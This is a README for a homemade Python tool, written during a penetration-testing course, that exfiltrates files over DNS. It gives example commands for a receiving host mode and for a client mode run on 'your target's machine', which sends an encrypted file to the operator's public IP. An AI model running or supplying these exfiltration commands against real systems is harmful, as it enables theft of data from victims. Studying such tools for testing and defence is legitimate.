# A lightweight, easy-to-use, DNS data exfiltrator
As I was plowing through the INE eJPT course, I ran into a DNS data exfiltrator that I thought was annoying to use. So I rolled my own. This is the result. I am open to suggestions, critique and questions. I learned a lot from building this, both about the DNS protocol and how data exfiltration works and some neat tricks in Python. I hope it'll benefit you in your (legal!) endeavors.

## Installation
Just clone/download the script from this Git repo

## Dependencies / Requirements
* Python 3.8+
* PyCryptodome: `pip3 install pycryptodome`

## Usage
The script can be run in two modes: host or client. The host mode should be used on your own machine, where the data is being exfiltrated to. The client mode should be run on your target's machine, where the data is being exfiltrated from. The data that is being exfiltrated is encrypted using AES256 symmetric encryption. It is therefore important that you set the same seed phrase or password on both the host and client.

### Host
Running the script in host mode will run a mock DNS server on udp/53 (by default, you can change the port if you want to) which is built specifically to receive exfiltrated data from the script in client mode. For example:
```
python3 dns-exfil.py -mode host -hostip "127.0.0.1" -password "s3cr3tp4ssw0rd"
```

### Client
On your target machine, copy-paste / install the script and run it. For example:
```
python3 dns-exfil.py -mode client -dest "your_public_machine_ip" -password "s3cr3tp4ssw0rd" -file "/path/to/the/file/you/want/to/exfil"
```

### More help
```
python3 dns-exfil.py -h
```
